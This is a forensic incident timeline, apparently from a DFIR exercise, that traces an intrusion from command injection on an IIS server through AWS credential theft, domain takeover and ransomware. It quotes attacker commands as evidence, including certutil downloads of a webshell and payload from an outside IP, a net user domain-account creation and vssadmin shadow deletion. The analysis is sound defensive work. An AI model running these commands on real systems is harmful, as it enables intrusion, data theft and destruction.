# Timeline

## Phase 0 · Unauthenticated Recon
| UTC | Host | Event | Evidence |
|---|---|---|---|
| 2026-03-08 18:38:29 | IIS-SERV-PROD | Attacker (172.236.127.251) browses to barrygoodtech.com | IIS W3SVC log |
| 2026-03-08 18:40:01 | IIS-SERV-PROD | First OS command injection: `url=Google.com \| whoami` via CheckStatus.aspx | IIS W3SVC log |
| 2026-03-08 18:41:13 | IIS-SERV-PROD | Successful `whoami` returns IIS service account context | IIS log sc-bytes=1345 |
| 2026-03-08 18:42:38 | IIS-SERV-PROD | Directory enumeration: `dir C:\inetpub` via cmd injection | IIS W3SVC log |
| 2026-03-08 18:45:12 | IIS-SERV-PROD | Discovers `C:\"TFTP Server"` — identifies SolarwindsTFTP unquoted path | IIS W3SVC log |

## Phase 1 · Initial Foothold
| UTC | Host | Event | Evidence |
|---|---|---|---|
| 2026-03-08 18:51:42 | IIS-SERV-PROD | `certutil -urlcache -f http://173.230.136.180:80/so.aspx C:\inetpub\wwwroot\so.aspx` | IIS W3SVC log |
| 2026-03-08 18:52:20 | IIS-SERV-PROD | `certutil -urlcache -f http://173.230.136.180:80/iis.exe %TEMP%\iis.exe` | IIS W3SVC log |
| 2026-03-08 19:08:42 | IIS-SERV-PROD | First POST to so.aspx — webshell activated (curl/8.5.0, 7556 bytes returned) | IIS W3SVC log |
| 2026-03-08 19:38:02 | IIS-SERV-PROD | SolarwindsTFTP service starts Solarwinds.exe — SYSTEM achieved via unquoted path hijack | EID 7036 System.evtx |
| 2026-03-08 19:40:36 | IIS-SERV-PROD | Final webshell POST — IMDS enumeration via powershell -enc | IIS W3SVC log |

## Phase 2 · Cloud Pivot & Authenticated Recon
| UTC | Host | Event | Evidence |
|---|---|---|---|
| 2026-03-08 21:42:11 | AWS | GetCallerIdentity — AWS whoami with stolen iam_role_iisserver creds from 212.8.249.213 | CloudTrail |
| 2026-03-08 21:42:58 | AWS | ListRolePolicies / ListAttachedRolePolicies — IAM enumeration | CloudTrail |
| 2026-03-08 21:44:19 | AWS | ListUsers — domain account enumeration via AWS | CloudTrail |
| 2026-03-08 21:45:38 | AWS | CreateAccessKey → LimitExceededException — persistence attempt failed | CloudTrail |
| 2026-03-08 21:46:26 | AWS | ListBuckets / ListObjects — S3 target discovery | CloudTrail |
| 2026-03-08 21:49:16 | AWS | 164× GetObject — S3 data exfiltration | CloudTrail / S3 access logs |

## Phase 3 · Privilege Escalation
| UTC | Host | Event | Evidence |
|---|---|---|---|
| 2026-03-08 19:59:00 | LAF-SVR01 | rnSylwOz.exe launched from \\10.3.10.12\ADMIN$ via services.exe — C2 ESTABLISHED | Volatility pslist/netscan |
| 2026-03-08 20:01:16 | LAF-SVR01 | explorer.exe PID 1332 injected — RWX PE at 0xa60000 — beacon to 173.230.136.180:8443 | Volatility malfind |
| 2026-03-08 20:02:14 | LAF-SVR01 | `net user serviceaccount P@ssw0RD1! /add /domain` executed as LAFAdmin | Sysmon EID 1 ExecutableInfo |
| 2026-03-08 20:03:05 | LAF-DC01 | serviceaccount added to Domain Admins — full domain control achieved | DC01 Security EID 4728 |
| 2026-03-08 20:03:30 | LAF-SVR01 | LSASS dumped → C:\windows\temp\abedgdaa.dmp (12.2 MB) | SVR01 MFT |
| 2026-03-08 20:08:44 | LAF-DC01 | Impacket smbexec service UnmfmnOL installed | DC01 System EID 7045 |
| 2026-03-08 20:09:03 | LAF-DC01 | VSS shadow copy — ntds.dit → C:\Windows\Temp\ZIFylmKF.tmp | DC01 MFT |

## Phase 4 · Lateral Movement
| UTC | Host | Event | Evidence |
|---|---|---|---|
| 2026-03-08 20:14:08 | LAF-SVR01 | RED1 (198.51.100.3) RDP session opened on SVR01 | Volatility pstree session 6 |
| 2026-03-08 20:16:23 | LAF-WS01 | LAFAdmin Type-3 logon from SVR01 (10.3.10.12) | WS01 Security 4624 |
| 2026-03-08 20:16:46 | LAF-WS02 | LAFAdmin Type-3 logon from SVR01 (10.3.10.12) | WS02 Security 4624 |
| 2026-03-08 20:20:13 | LAF-SVR01 | msupdate.exe (renamed Makecab.exe) — Data.cab collection begins | SVR01 MFT + Sysmon |
| 2026-03-08 20:35:29 | LAF-WS01 | RED1 interactive RDP logon as LAF\Donny (Type 10) | WS01 Security 4624 |
| 2026-03-08 20:37:03 | LAF-WS01 | aws_backup.exe dropped to C:\ProgramData\ | WS01 MFT |
| 2026-03-08 20:37:35 | LAF-WS01 | IFEO persistence: taskmgr.exe Debugger → aws_backup.exe | WS01 Sysmon EID 13 |
| 2026-03-08 20:46:03 | LAF-DC02 | Advanced IP Scanner 2.5.4594 downloaded to LAFAdmin\Downloads | DC02 MFT |
| 2026-03-08 21:00:21 | LAF-DC02 | PowerShell profile shellcode persistence installed | DC02 MFT |
| 2026-03-08 21:08:28 | LAF-SVR01 | LogDel.bat executed — event log clearing | SVR01 Sysmon EID 1 |
| 2026-03-08 21:57:07 | LAF-WS02 | DisableRestrictedAdmin registry set — PtH-over-RDP enabled | WS02 Sysmon EID 13 |
| 2026-03-08 21:57:14 | LAF-WS02 | DPAPI master key backup (EID 4692) | WS02 Security |
| 2026-03-08 22:06:35 | LAF-SVR01 | Outbound RDP to LAF-DC02 (10.3.10.11) | Volatility netscan |

## Phase 5 · Domain Dominance & Ransomware
| UTC | Host | Event | Evidence |
|---|---|---|---|
| 2026-03-08 22:08:40 | LAF-WS02 | FIRST ENCRYPTION — .bWqQUx ransomware on WS02 (OlgyLYbd sched task) | WS02 MFT |
| 2026-03-08 22:09:15 | LAF-WS01 | vssadmin delete shadows /all /quiet; IamBatman.exe encrypt C:\ | WS01 Sysmon EID 1 |
| 2026-03-08 22:10:14 | LAF-DC01 | DC01 encrypted — .bWqQUx files confirmed | DC01 MFT |
| 2026-03-08 22:10:54 | LAF-DC02 | DC02 encrypted | DC02 MFT |
| 2026-03-08 22:30:21 | LAF-SVR01 | Inbound RDP from RED1 (198.51.100.3) — attacker reconnects | Volatility netscan |
| 2026-03-08 22:46:45 | LAF-SVR01 | Memory image captured (KAPE / DumpIt) — investigation begins | Volatility windows.info |
